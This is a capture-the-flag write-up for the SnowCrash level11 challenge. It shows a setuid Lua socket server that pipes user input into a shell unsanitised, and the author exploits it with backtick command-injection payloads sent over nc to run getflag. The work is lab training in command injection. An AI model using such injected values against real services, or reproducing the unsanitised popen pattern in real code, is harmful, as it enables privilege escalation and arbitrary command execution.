# level11

## Hint

As we log in as level11, we see the source file for a lua script that is apparently already running on the machine:

```shell-session
level11@192.168.1.28's password:
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
level11@SnowCrash:~$ ./level11.lua
lua: ./level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	./level11.lua:3: in main chunk
	[C]: ?
```

We easily see that there are some recurring falicies we have dealt with before, namely:
- `suid` set for the script
- A call to `socket` to address a local host IP `127.0.0.1` and a port `5151`
- A call to a system wide binary `echo`

```lua
#!/usr/bin/env lua
local socket = require("socket")                #<- System call socket
local server = assert(socket.bind("127.0.0.1", 5151)) #<- IP and PORT

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r") #<- System call echo
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

With all this information, and the absence of protection on the different system calls, there should be some code injection possible to escalate our user rights

## nc

As we did previously, we may listen a given IP and port, specifically the ones used by the lua script.

Unsurprisingly, we are greated with a prompt:

```shell-session
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: 
```

## getflag

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r") #<- pipe preventing printing to stdout 
```

Since the script uses a pipe to do its thing, we cannot see the output of that first call to `echo` but we can definitely redirect its output

After a few tries, and a redirection, we can easily get the script to interpret commands:

```shell-session
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `echo "42"` > /tmp/test
Erf nope..
level11@SnowCrash:~$ cat /tmp/test
42
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `getflag` > /tmp/test
Erf nope..
level11@SnowCrash:~$ cat /tmp/test
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

